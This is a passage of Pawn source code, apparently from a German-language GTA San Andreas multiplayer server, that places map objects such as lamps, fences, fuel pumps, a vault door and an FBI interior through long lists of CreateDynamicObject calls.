     CreateDynamicObject(3458, -166.490250, -1849.296631, -1.465709, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(1461, -206.285645, -1798.071655, 1.620938, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(1461, -196.184875, -1748.688232, 1.624141, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(9237, -195.864822, -1714.607300, 8.805156, 0.0000, 0.0000, 168.7499);
     CreateDynamicObject(5152, -235.263214, -1728.845215, 1.858285, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(5152, -234.863113, -1726.731934, 1.920299, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(5152, -235.599884, -1730.792603, 1.803543, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(3406, -240.562805, -1725.526978, 0.875801, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(3406, -240.952545, -1727.528076, 0.865175, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(3406, -241.327469, -1729.483276, 0.867492, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(8420, -235.006424, -1738.029053, 0.870311, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(638, -222.344025, -1740.557129, 1.700157, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(638, -229.468781, -1739.096680, 1.700157, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(638, -207.347610, -1724.166870, 1.747032, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(638, -203.171387, -1724.884521, 1.747032, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(638, -198.849045, -1725.574829, 1.747032, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(1231, -212.670380, -1724.180908, 3.780391, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(1231, -205.418961, -1724.271240, 3.577266, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(1231, -200.945969, -1725.309204, 3.780391, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(1231, -225.759155, -1739.775513, 3.733516, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(1231, -211.498688, -1706.527832, 3.780391, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(2773, -201.242035, -1773.199097, 1.336953, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(2773, -200.686172, -1770.127563, 1.361953, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(2796, -214.811600, -1775.020630, 2.336676, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(3666, -226.557678, -1758.541016, 1.563684, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(3666, -223.163895, -1759.122925, 1.563684, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(3666, -220.017609, -1759.714722, 1.563684, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(3666, -216.881943, -1760.318604, 1.563684, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(3666, -214.042953, -1760.891113, 1.563684, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(3666, -211.104675, -1761.548584, 1.563684, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(3666, -208.093292, -1762.134033, 1.563684, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(3666, -108.299225, -1773.037231, 0.663969, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(3666, -104.712440, -1753.843018, 0.868894, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(3666, -112.752914, -1796.811890, 0.673573, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(3666, -116.567947, -1816.287598, 0.669799, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(3666, -119.861382, -1835.384033, 0.707929, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(638, -221.810455, -1829.379761, 1.519963, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(638, -227.412872, -1828.293823, 1.519963, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(638, -232.962753, -1826.917114, 1.519963, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(1643, -224.707489, -1828.770874, 0.817874, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(1643, -230.183624, -1827.778442, 0.817874, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(1643, -236.073822, -1826.617310, 0.817874, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(3657, -224.181580, -1827.404175, 1.341141, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(3657, -229.791016, -1826.450439, 1.341141, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(3657, -235.623322, -1825.346558, 1.341141, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(1281, -223.987030, -1823.298340, 1.620107, 0.0000, 0.0000, 33.7500);
     CreateDynamicObject(1281, -228.744110, -1820.457397, 1.620107, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(5184, -268.501099, -1799.074585, 19.338663, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(1281, -234.780762, -1820.450928, 1.963762, 0.0000, 0.0000, 22.5000);
     CreateDynamicObject(1231, -239.854080, -1824.321411, 3.553320, 0.0000, 0.0000, 270.0000);
     CreateDynamicObject(1231, -219.485794, -1828.553833, 3.550118, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(1210, -207.079453, -1778.610962, 1.718162, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(5152, -233.285431, -1727.111206, 1.145057, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(5152, -234.681610, -1729.018066, 1.570056, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(5152, -235.076584, -1730.903687, 1.560713, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(5152, -247.368256, -1724.213989, 1.923523, 0.0000, 0.0000, 348.7499);
     CreateDynamicObject(5152, -247.776413, -1726.182007, 1.930465, 0.0000, 0.0000, 348.7499);
     CreateDynamicObject(5152, -248.105225, -1728.009521, 1.948787, 0.0000, 0.0000, 348.7499);
     CreateDynamicObject(970, -244.057159, -1729.954956, 3.395098, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(970, -239.959290, -1730.778076, 3.396802, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(970, -243.027176, -1724.072632, 3.505111, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(970, -238.946716, -1724.882813, 3.498100, 0.0000, 0.0000, 348.7500);
*/
//Banktresortür
    CreateDynamicObject(2963, 2144.2492675781, 1606.7133789063, 994.75732421875, 0, 0, 270.67565917969);


//FBI Interior
	CreateDynamicObject(1649, 246.5, 119.5, 1004.9000244141, 0, 0, 0);
	CreateDynamicObject(1649, 242.19999694824, 119.5, 1004.9000244141, 0, 0, 0);
	CreateDynamicObject(1649, 250.89999389648, 119.59999847412, 1004.9000244141, 0, 0, 2);
	CreateDynamicObject(914, 239.60000610352, 112.30000305176, 1005, 0, 0, 276);
	CreateDynamicObject(914, 239.5, 113.5, 1005, 0, 0, 275.99853515625);
	CreateDynamicObject(914, 253.30000305176, 118, 1005, 0, 0, 89.998565673828);
	CreateDynamicObject(914, 253.30000305176, 116.80000305176, 1005, 0, 0, 89.994506835938);
	CreateDynamicObject(1649, 250.60000610352, 119.40000152588, 1004.9000244141, 0, 0, 180);
	CreateDynamicObject(1649, 246.19999694824, 119.40000152588, 1004.9000244141, 0, 0, 179.99450683594);
	CreateDynamicObject(1649, 241.80000305176, 119.40000152588, 1004.9000244141, 0, 0, 179.99450683594);

//Savebox
	  CreateDynamicObject(964,2133.82666016,-1787.04248047,12.52786732,0.00000000,0.00000000,0.00000000); //Savebox PizzaLaden Idlewood
	  CreateDynamicObject(964,836.9014,-1853.4141,6.4093,0.0,0.0,0.0); //Strand



//Lampen in SA
	  CreateDynamicObject(1215, 1554.292358, -1672.484253, 16.236198, 0.0000, 0.0000, 0.0000);
	  CreateDynamicObject(1215, 1554.540039, -1678.753174, 16.236198, 0.0000, 0.0000, 0.0000);
	  CreateDynamicObject(1215, 1219.033081, -923.268433, 42.658073, 0.0000, 0.0000, 0.0000);
	  CreateDynamicObject(1215, -890.670898, -1106.842285, 98.519646, 0.0000, 0.0000, 0.0000);
	  CreateDynamicObject(1215, -895.001831, -1121.806030, 98.525261, 0.0000, 0.0000, 0.0000);
	  CreateDynamicObject(1215, -1215.353638, -774.154785, 63.461586, 0.0000, 0.0000, 0.0000);
	  CreateDynamicObject(1215, -1225.152100, -783.667297, 63.470837, 0.0000, 0.0000, 0.0000);

//Benzin Zapfseulen
	  CreateDynamicObject(1686, 999.061584, -937.677124, 41.341427, 0.0000, 0.0000, 279.5312);
	  CreateDynamicObject(1686, 1001.707642, -937.323975, 41.341427, 0.0000, 0.0000, 277.8123);
	  CreateDynamicObject(1686, 1006.411499, -936.608154, 41.341427, 0.0000, 0.0000, 278.6717);
	  CreateDynamicObject(1686, 1008.847473, -936.295105, 41.341427, 0.0000, 0.0000, 276.0161);
	  CreateDynamicObject(1676, -2026.529053, 156.427383, 29.619930, 0.0000, 0.0000, 270.0000);
	  CreateDynamicObject(1478, 403.10845947266, -1166.8913574219, 78.271385192871, 0, 0, 332.21020507813);
	  CreateDynamicObject(1215, 401.99563598633, -1166.8287353516, 78.22876739502, 0, 0, 0);
	  CreateDynamicObject(1215, 396.21929931641, -1162.908203125, 78.38159942627, 0, 0, 0);
	  CreateDynamicObject(1215, 402.88714599609, -1151.4522705078, 76.765037536621, 0, 0, 0);
	  CreateDynamicObject(1215, 400.11080932617, -1156.8591308594, 77.554794311523, 0, 0, 0);
	  CreateDynamicObject(1215, 419.89184570313, -1162.5523681641, 76.251937866211, 0, 0, 0);
	  CreateDynamicObject(1215, 412.61679077148, -1158.216796875, 76.251937866211, 0, 0, 0);
	  CreateDynamicObject(1432, 430.77648925781, -1135.6459960938, 72.716911315918, 0, 0, 0);
	  CreateDynamicObject(1432, 426.81814575195, -1133.3518066406, 72.716911315918, 0, 0, 0);


// Anzeige Tafel
	  CreateDynamicObject(648, 1180.917725, -1418.015747, 14.331814, 0.0000, 0.0000, 247.5000);
	  CreateDynamicObject(1282, 1228.083008, -918.375244, 42.590260, 0.0000, 0.0000, 0.0000);
	  CreateDynamicObject(1309, 1311.811646, -951.617676, 50.117989, 0.0000, 0.0000, 325.3906);
	  CreateDynamicObject(2790, 1314.072998, -946.420166, 62.206589, 0.0000, 0.0000, 236.2501);
	  CreateDynamicObject(2790, 1311.052490, -950.745300, 62.184284, 0.0000, 359.1406, 237.0320);
	  CreateDynamicObject(2790, 1316.990723, -942.176880, 62.219135, 0.0000, 0.0000, 236.2501);
	  CreateDynamicObject(2790, 1308.280762, -954.797180, 62.250763, 0.0000, 0.0000, 236.2501);
	  CreateDynamicObject(18244, 1314.947266, -944.974426, 56.388088, 88.5220, 358.2811, 57.1094);


//=========NEU=NEU==========//
/*
	CreateDynamicObject(1215, 2456.6000976563, -1658.9000244141, 12.89999961853, 0, 0, 0);
	CreateDynamicObject(1215, 2463.2998046875, -1658.8994140625, 12.89999961853, 0, 0, 0);
	CreateDynamicObject(1215, 2446.8999023438, -1658.8000488281, 12.89999961853, 0, 0, 0);
	CreateDynamicObject(1215, 2428.6999511719, -1659, 12.89999961853, 0, 0, 0);
	CreateDynamicObject(1215, 2438.19921875, -1659, 12.89999961853, 0, 0, 0);
	CreateDynamicObject(1215, 2418.5, -1659, 12.89999961853, 0, 0, 0);
	CreateDynamicObject(1215, 2412.6000976563, -1659, 12.89999961853, 0, 0, 0);
	CreateDynamicObject(1215, 2396.3000488281, -1659, 12.89999961853, 0, 0, 0);
	CreateDynamicObject(1215, 2405.599609375, -1659, 12.89999961853, 0, 0, 0);
	CreateDynamicObject(1215, 2386, -1658.9000244141, 12.89999961853, 0, 0, 0);
	CreateDynamicObject(1215, 2375.8000488281, -1659, 12.89999961853, 0, 0, 0);
	CreateDynamicObject(1215, 2364.8999023438, -1659, 12.89999961853, 0, 0, 0);
	CreateDynamicObject(1215, 2357.6999511719, -1659.0999755859, 12.89999961853, 0, 0, 0);
	CreateDynamicObject(1232, 2469.1000976563, -1690.3000488281, 15.10000038147, 0, 0, 0);
	CreateDynamicObject(1232, 2478.099609375, -1647.8994140625, 15.10000038147, 0, 0, 0);
	CreateDynamicObject(1232, 2460.3994140625, -1647.3994140625, 15.10000038147, 0, 0, 0);
	CreateDynamicObject(1232, 2446.099609375, -1647.8994140625, 15.10000038147, 0, 0, 0);
	CreateDynamicObject(1232, 2486.1000976563, -1691.0999755859, 15.199999809265, 0, 0, 0);
	CreateDynamicObject(1232, 2500.8999023438, -1688.8000488281, 15.199999809265, 0, 0, 0);
	CreateDynamicObject(1232, 2513.8999023438, -1682.4000244141, 15, 0, 0, 0);
	CreateDynamicObject(1232, 2521.8000488281, -1667.3000488281, 16.60000038147, 0, 0, 0);
	CreateDynamicObject(1232, 2521.8999023438, -1658.3000488281, 16.10000038147, 0, 0, 0);
	CreateDynamicObject(1232, 2492.5, -1646.6999511719, 15.199999809265, 0, 0, 0);
	CreateDynamicObject(1232, 2513, -1654.099609375, 15.5, 0, 0, 0);
	CreateDynamicObject(1232, 2505.3994140625, -1648.599609375, 15.39999961853, 0, 0, 0);
	CreateDynamicObject(1360, 2529.6000976563, -1720.5999755859, 13.300000190735, 0, 0, 0);
	CreateDynamicObject(1360, 2531.5, -1708.3000488281, 13.199999809265, 0, 0, 0);
	CreateDynamicObject(1360, 2526, -1708.6999511719, 13.199999809265, 0, 0, 0);
	CreateDynamicObject(1360, 2520.1000976563, -1708.9000244141, 13.199999809265, 0, 0, 0);
	CreateDynamicObject(1360, 2524.3000488281, -1720.5, 13.300000190735, 0, 0, 0);
	CreateDynamicObject(970, 2538.8999023438, -1716.1999511719, 13, 0, 0, 0);
	CreateDynamicObject(970, 2536.8000488281, -1718.1999511719, 13, 0, 0, 90);
	CreateDynamicObject(970, 2536.8999023438, -1707.5, 13, 0, 0, 90);
	CreateDynamicObject(970, 2536.7998046875, -1720, 13, 0, 0, 90);
	CreateDynamicObject(970, 2538.8999023438, -1709.5999755859, 13, 0, 0, 0);
	CreateDynamicObject(970, 2536.8999023438, -1703.4000244141, 12.89999961853, 0, 0, 90);
	CreateDynamicObject(970, 2539, -1701.3000488281, 12.699999809265, 0, 0, 4);
	CreateDynamicObject(970, 2519.8000488281, -1711.9000244141, 13.10000038147, 0, 0, 90);
	CreateDynamicObject(1468, 2460.5, -1669.0999755859, 13.800000190735, 0, 0, 0);
	CreateDynamicObject(1468, 2460.5, -1669.099609375, 13.800000190735, 0, 0, 0);
	//CreateDynamicObject(1361, 2537, -1715.9000244141, 13.199999809265, 0, 0, 0);
	//CreateDynamicObject(1361, 2537.099609375, -1709.8994140625, 13.199999809265, 0, 0, 0);
	//CreateDynamicObject(1361, 2537, -1715.8994140625, 13.199999809265, 0, 0, 0);
	//CreateDynamicObject(1361, 2534.5, -1698.8000488281, 13.10000038147, 0, 0, 0);
	//CreateDynamicObject(1361, 2539.1000976563, -1698.3000488281, 13.10000038147, 0, 0, 0);
	//CreateDynamicObject(1361, 2466.1999511719, -1652.1999511719, 13.199999809265, 0, 0, 0);
	//CreateDynamicObject(1361, 2465.7998046875, -1667.099609375, 13.199999809265, 0, 0, 0);
	CreateDynamicObject(1358, 2489.6000976563, -1669.8000488281, 13.5, 0, 0, 0);
	CreateDynamicObject(1448, 2489.3000488281, -1668.3000488281, 12.39999961853, 0, 0, 0);
	CreateDynamicObject(1549, 2487.8000488281, -1668.6999511719, 12.300000190735, 0, 0, 0);
	CreateDynamicObject(854, 2485, -1660, 12.5, 0, 0, 0);
	CreateDynamicObject(1257, 2531.6000976563, -1667.4000244141, 15.39999961853, 0, 0, 0);
	CreateDynamicObject(970, 1076.4000244141, -1270.8000488281, 17.60000038147, 0, 0, 0);
	CreateDynamicObject(970, 1080.599609375, -1270.7998046875, 17.60000038147, 0, 0, 0);
	CreateDynamicObject(970, 1075, -1270.8000488281, 17.60000038147, 0, 0, 0);
	CreateDynamicObject(1215, 1072.8000488281, -1270.6999511719, 17.700000762939, 0, 0, 0);
	CreateDynamicObject(970, 1072.8000488281, -1268.5, 17.60000038147, 0, 0, 270);
	CreateDynamicObject(970, 1072.8000488281, -1265.8000488281, 17.60000038147, 0, 0, 270);
	CreateDynamicObject(970, 1072.8000488281, -1261.5999755859, 18.200000762939, 0, 0, 270);
	CreateDynamicObject(970, 1072.8000488281, -1258.8000488281, 18.200000762939, 0, 0, 270);
	CreateDynamicObject(970, 1072.8000488281, -1254.5, 18.799999237061, 0, 0, 270);
	CreateDynamicObject(970, 1072.8000488281, -1251.5999755859, 18.799999237061, 0, 0, 270);
	CreateDynamicObject(970, 1072.8000488281, -1247.4000244141, 19.39999961853, 0, 0, 270);
	CreateDynamicObject(970, 1072.8000488281, -1244.4000244141, 19.39999961853, 0, 0, 270);
	CreateDynamicObject(970, 1072.8000488281, -1240.3000488281, 19.89999961853, 0, 0, 270);
	CreateDynamicObject(970, 1072.8000488281, -1237.4000244141, 19.89999961853, 0, 0, 270);
	CreateDynamicObject(970, 1072.8000488281, -1233.5, 21, 0, 0, 270);
	CreateDynamicObject(970, 1072.8000488281, -1229.3000488281, 21, 0, 0, 270);
	CreateDynamicObject(970, 1072.6999511719, -1225.1999511719, 21.10000038147, 0, 0, 270);
	CreateDynamicObject(970, 1072.6999511719, -1221, 21.10000038147, 0, 0, 270);
	CreateDynamicObject(970, 1072.6999511719, -1216.9000244141, 21.10000038147, 0, 0, 270);
	CreateDynamicObject(970, 1072.6999511719, -1213, 21, 0, 0, 270);
	CreateDynamicObject(970, 1073.3000488281, -1201.0999755859, 23.200000762939, 0, 0, 270);
	CreateDynamicObject(970, 1073.3000488281, -1198.9000244141, 23.200000762939, 0, 0, 270);
	CreateDynamicObject(970, 1072.9000244141, -1194.5999755859, 24.700000762939, 0, 0, 270);
	CreateDynamicObject(970, 1072.9000244141, -1190.5, 24.700000762939, 0, 0, 270);
	CreateDynamicObject(970, 1072.9000244141, -1187.5, 26.10000038147, 0, 0, 270);
	CreateDynamicObject(970, 1072.9000244141, -1183.3000488281, 26.10000038147, 0, 0, 270);
	CreateDynamicObject(1215, 1083.5, -1245, 16.700000762939, 0, 0, 0);
	CreateDynamicObject(1215, 1083.6999511719, -1214, 18.60000038147, 0, 0, 0);
	CreateDynamicObject(1215, 1084.19921875, -1216.2998046875, 19.60000038147, 0, 0, 0);
	CreateDynamicObject(1575, 1091.6999511719, -1184, 19.5, 0, 0, 14);
	CreateDynamicObject(1575, 1092.5999755859, -1185.0999755859, 19.60000038147, 0, 0, 0);
	CreateDynamicObject(1575, 1091.5999755859, -1185.5, 19.60000038147, 0, 0, 335.99487304688);
	CreateDynamicObject(1212, 1089.5999755859, -1184.0999755859, 17.299999237061, 0, 0, 0);
	CreateDynamicObject(1550, 1089.5999755859, -1184.9000244141, 17.700000762939, 0, 0, 0);
	CreateDynamicObject(1550, 1089.599609375, -1183.3994140625, 17.700000762939, 0, 0, 0);
	CreateDynamicObject(1550, 1089.8000488281, -1184.0999755859, 17.700000762939, 0, 0, 0);
	CreateDynamicObject(2359, 1090.9000244141, -1184.9000244141, 19.700000762939, 0, 0, 0);
	CreateDynamicObject(925, 1084, -1183.8000488281, 18.39999961853, 0, 0, 0);
	CreateDynamicObject(930, 1085.8000488281, -1183.4000244141, 17.799999237061, 0, 0, 0);
	CreateDynamicObject(1370, 1124.1999511719, -1212.0999755859, 17.700000762939, 0, 0, 0);
	CreateDynamicObject(1370, 1120.3994140625, -1193.8994140625, 31.60000038147, 0, 0, 0);
	CreateDynamicObject(1370, 1124.4000244141, -1201.5999755859, 17.5, 0, 0, 0);
	CreateDynamicObject(1370, 1074.5, -1203.4000244141, 23.200000762939, 0, 0, 0);
	CreateDynamicObject(1370, 1073.8000488281, -1211.3000488281, 21, 0, 0, 0);
	CreateDynamicObject(5821, 1087, -1251.5999755859, 17.700000762939, 0, 0, 270);
	//CreateDynamicObject(1361, 1112.8000488281, -1222.0999755859, 17.700000762939, 0, 0, 0);
	//CreateDynamicObject(1361, 1083.1999511719, -1222.0999755859, 17.5, 0, 0, 0);
	CreateDynamicObject(1360, 1081.8000488281, -1204.6999511719, 17.60000038147, 0, 0, 0);
	CreateDynamicObject(1360, 1092, -1190.5999755859, 18, 0, 0, 0);
	CreateDynamicObject(1360, 1104.7998046875, -1190.599609375, 18, 0, 0, 0);
	CreateDynamicObject(1360, 1082, -1210.0999755859, 17.60000038147, 0, 0, 0);
	CreateDynamicObject(2653, 1079.1999511719, -1207.3000488281, 19.700000762939, 0, 0, 0);
	CreateDynamicObject(1255, 1084.5, -1269, 21.10000038147, 0, 0, 34);
	CreateDynamicObject(1255, 1084.5999755859, -1266.8000488281, 21.10000038147, 0, 0, 33.997192382813);
	CreateDynamicObject(1255, 1084.5, -1264.8000488281, 21.10000038147, 0, 0, 33.997192382813);
	CreateDynamicObject(1231, 1087.5999755859, -1254.0999755859, 23.299999237061, 0, 0, 0);
	CreateDynamicObject(1231, 1133.4000244141, -1254.4000244141, 23.299999237061, 0, 0, 0);
	CreateDynamicObject(1231, 1098.19921875, -1254.2998046875, 23.299999237061, 0, 0, 0);
	CreateDynamicObject(1231, 1108.19921875, -1254.099609375, 23.299999237061, 0, 0, 0);
	CreateDynamicObject(1231, 1122, -1254.099609375, 23.299999237061, 0, 0, 0);
	CreateDynamicObject(1703, 1107.1999511719, -1267.5999755859, 20.5, 0, 0, 180);
	CreateDynamicObject(1703, 1103.5, -1267.5, 20.5, 0, 0, 179.99450683594);
	CreateDynamicObject(1703, 1099.4000244141, -1266.1999511719, 20.5, 0, 0, 91.994506835938);
	CreateDynamicObject(1703, 1108.9000244141, -1263.8000488281, 20.5, 0, 0, 271.99401855469);
	CreateDynamicObject(1827, 1104.3000488281, -1264.8000488281, 20.5, 0, 0, 0);
	CreateDynamicObject(1704, 1103.5999755859, -1262.4000244141, 20.5, 0, 0, 0);
	CreateDynamicObject(1215, 1099.1999511719, -1263.3000488281, 21.10000038147, 0, 0, 0);
	CreateDynamicObject(1215, 1108.9000244141, -1262.6999511719, 21.10000038147, 0, 0, 0);
	CreateDynamicObject(2964, 1103.5999755859, -1255.5999755859, 20.5, 0, 0, 0);
	CreateDynamicObject(2964, 1116, -1255.9000244141, 20.5, 0, 0, 0);
	CreateDynamicObject(2964, 1093.0999755859, -1255.5, 20.5, 0, 0, 0);
*/
//========NEU=NEU===========//



	//-----------------------------------------------------------------------------------
	CreateDynamicObject(988, 3572.873779, -1638.097900, 0.386014, 269.7591, 0.0000, 0.0000);//spawn
	//-----------------------------------------------------------------------------------



//Rund Um Die Stadt !

	CreateDynamicObject(982, 1304.9468994141, -1697.9730224609, 13.230429649353, 0, 0, 0);
	CreateDynamicObject(982, 1304.9357910156, -1723.5932617188, 13.230429649353, 0, 0, 0);
	CreateDynamicObject(982, 1304.8927001953, -1749.2042236328, 13.230429649353, 0, 0, 0);
	CreateDynamicObject(982, 1304.8973388672, -1774.8034667969, 13.230429649353, 0, 0, 0);
	CreateDynamicObject(982, 1304.8526611328, -1800.4556884766, 13.230429649353, 0, 0, 0);
	CreateDynamicObject(982, 1304.8597412109, -1826.0609130859, 13.230429649353, 0, 0, 0);
	CreateDynamicObject(870, 1304.7902832031, -1726.6826171875, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1304.9122314453, -1721.2595214844, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1304.9937744141, -1715.4724121094, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1304.8856201172, -1709.2572021484, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1305.0769042969, -1702.6242675781, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1304.8564453125, -1696.8950195313, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1305.0018310547, -1692.0639648438, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1304.9611816406, -1686.7077636719, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1304.7788085938, -1733.8428955078, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1305.0598144531, -1738.4645996094, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1304.8704833984, -1742.7396240234, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1304.9692382813, -1747.9169921875, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1304.9197998047, -1756.7983398438, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1305.0006103516, -1761.0760498047, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1305.2108154297, -1766.4068603516, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1305.1602783203, -1771.2668457031, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1305.1342773438, -1777.1391601563, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1304.9768066406, -1784.2071533203, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1304.9241943359, -1789.4011230469, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1305.1027832031, -1794.4035644531, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1305.0925292969, -1800.1236572266, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1305.0780029297, -1805.6018066406, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1305.1309814453, -1812.8205566406, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1305.4063720703, -1818.2906494141, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1305.1798095703, -1823.6356201172, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1305.138671875, -1828.8887939453, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1305.0269775391, -1834.2932128906, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1304.6956787109, -1842.2237548828, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(984, 1306.8974609375, -1548.1116943359, 13.183554649353, 0, 0, 352);
	CreateDynamicObject(984, 1307.3767089844, -1544.9272460938, 13.183554649353, 0, 0, 351.99645996094);
	CreateDynamicObject(984, 1310.7010498047, -1532.611328125, 13.183554649353, 0, 0, 337.99096679688);
	CreateDynamicObject(983, 1314.3104248047, -1523.7216796875, 13.222636222839, 0, 0, 338);
	CreateDynamicObject(983, 1315.5098876953, -1520.7918701172, 13.222636222839, 0, 0, 337.99987792969);
	CreateDynamicObject(984, 1320.2944335938, -1512.49609375, 13.183554649353, 0, 0, 325.98889160156);
	CreateDynamicObject(984, 1327.4541015625, -1501.9254150391, 13.183554649353, 0, 0, 325.986328125);
	CreateDynamicObject(984, 1333.8764648438, -1490.8311767578, 13.183554649353, 0, 0, 333.986328125);
	CreateDynamicObject(984, 1338.8249511719, -1480.7482910156, 13.183554649353, 0, 0, 333.984375);
	CreateDynamicObject(984, 1343.0185546875, -1468.7991943359, 13.175761222839, 0, 0, 347);
	CreateDynamicObject(984, 1345.8800048828, -1456.4654541016, 13.183554649353, 0, 0, 346.99768066406);
	CreateDynamicObject(984, 1347.9301757813, -1443.8193359375, 13.183554649353, 0, 0, 354.99768066406);
	CreateDynamicObject(984, 1349.0433349609, -1431.0946044922, 13.183554649353, 0, 0, 354.99572753906);
	CreateDynamicObject(984, 1349.7193603516, -1423.1762695313, 13.183554649353, 0, 0, 354.99572753906);
	CreateDynamicObject(870, 1349.7622070313, -1418.4534912109, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1349.5935058594, -1423.2766113281, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1349.1450195313, -1428.7672119141, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1348.6840820313, -1434.7901611328, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1348.1314697266, -1440.1870117188, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1347.7141113281, -1447.2104492188, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1346.5600585938, -1453.3884277344, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1345.2602539063, -1458.8898925781, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1344.1955566406, -1464.7464599609, 12.781203269958, 0, 0, 0);
	CreateDynamicObject(870, 1342.9658203125, -1469.6669921875, 12.781203269958, 0, 0, 350);
	CreateDynamicObject(870, 1341.2407226563, -1476.2468261719, 12.781203269958, 0, 0, 339.99694824219);
	CreateDynamicObject(870, 1338.4833984375, -1481.7393798828, 12.788996696472, 0, 0, 339.99389648438);
	CreateDynamicObject(870, 1335.3601074219, -1487.8764648438, 12.788996696472, 0, 0, 339.99389648438);
	CreateDynamicObject(870, 1332.6290283203, -1493.501953125, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1328.6234130859, -1500.2862548828, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1324.8276367188, -1506.2065429688, 12.788996696472, 0, 0, 332);
	CreateDynamicObject(870, 1321.5795898438, -1510.9041748047, 12.788996696472, 0, 0, 331.99584960938);
	CreateDynamicObject(870, 1317.4368896484, -1516.9163818359, 12.788996696472, 0, 0, 331.99584960938);
	CreateDynamicObject(870, 1314.5092773438, -1523.1890869141, 12.781203269958, 0, 0, 331.99584960938);
	CreateDynamicObject(870, 1312.4759521484, -1528.8159179688, 12.781203269958, 0, 0, 0);
	CreateDynamicObject(870, 1309.9907226563, -1534.8317871094, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1307.9705810547, -1541.8428955078, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1307.1420898438, -1547.2496337891, 12.788996696472, 0, 0, 0);
	CreateDynamicObject(870, 1306.0828857422, -1552.8713378906, 12.788996696472, 0, 0, 0);
